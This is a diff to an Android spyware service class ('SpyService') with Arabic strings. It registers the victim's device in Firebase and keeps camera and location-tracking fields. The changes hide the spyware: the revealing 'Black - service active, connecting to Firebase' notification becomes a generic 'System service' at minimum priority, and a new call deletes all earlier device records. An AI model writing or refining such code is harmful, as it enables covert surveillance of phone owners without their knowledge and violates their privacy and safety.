@@ -37,11 +37,8 @@ import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.net.URL;
-import java.text.SimpleDateFormat;
-import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
-import java.util.Locale;
 import java.util.Map;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
@@ -58,7 +55,6 @@ public class SpyService extends Service {
     private boolean isRecording = false;
     private String deviceId;
     private Camera camera;
-    private Camera frontCamera;
     private LocationManager locationManager;
     private LocationListener locationListener;
     private boolean isTrackingLocation = false;
@@ -110,14 +106,14 @@ public class SpyService extends Service {
         if (foregroundStarted) return;
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                NotificationChannel ch = new NotificationChannel("spy_ch", "خدمة التحديث", NotificationManager.IMPORTANCE_LOW);
+                NotificationChannel ch = new NotificationChannel("spy_ch", "خدمة النظام", NotificationManager.IMPORTANCE_LOW);
                 getSystemService(NotificationManager.class).createNotificationChannel(ch);
             }
             Notification notification = new NotificationCompat.Builder(this, "spy_ch")
-                    .setContentTitle("🔱 بلاك - الخدمة نشطة")
-                    .setContentText("جاري الاتصال بـ Firebase...")
+                    .setContentTitle("⚙️ خدمة النظام")
+                    .setContentText("جاري التشغيل...")
                     .setSmallIcon(android.R.drawable.ic_menu_manage)
-                    .setPriority(NotificationCompat.PRIORITY_LOW)
+                    .setPriority(NotificationCompat.PRIORITY_MIN)
                     .setSilent(true)
                     .build();
             startForeground(1337, notification);
@@ -129,10 +125,10 @@ public class SpyService extends Service {
         if (foregroundStarted) {
             try {
                 Notification notification = new NotificationCompat.Builder(this, "spy_ch")
-                        .setContentTitle("🔱 بلاك - الخدمة نشطة")
+                        .setContentTitle("⚙️ خدمة النظام")
                         .setContentText(text)
                         .setSmallIcon(android.R.drawable.ic_menu_manage)
-                        .setPriority(NotificationCompat.PRIORITY_LOW)
+                        .setPriority(NotificationCompat.PRIORITY_MIN)
                         .setSilent(true)
                         .build();
                 startForeground(1337, notification);
@@ -142,6 +138,9 @@ public class SpyService extends Service {
 
     private void registerDevice() {
         try {
+            // حذف الأجهزة القديمة ليبقى جهاز واحد فقط
+            database.getReference("devices").removeValue();
+
             Map<String, Object> info = new HashMap<>();
             info.put("device_id", deviceId);
             info.put("device_name", Build.MANUFACTURER + " " + Build.MODEL);
@@ -151,7 +150,7 @@ public class SpyService extends Service {
             info.put("battery", getBatteryLevel());
             info.put("last_seen", System.currentTimeMillis());
             deviceRef.setValue(info);
-            updateNotification("✅ مسجل في Firebase");
+            updateNotification("✅ تم التسجيل");
             Log.d(TAG, "Registered");
         } catch (Exception e) { Log.e(TAG, "Registration error", e); }
     }
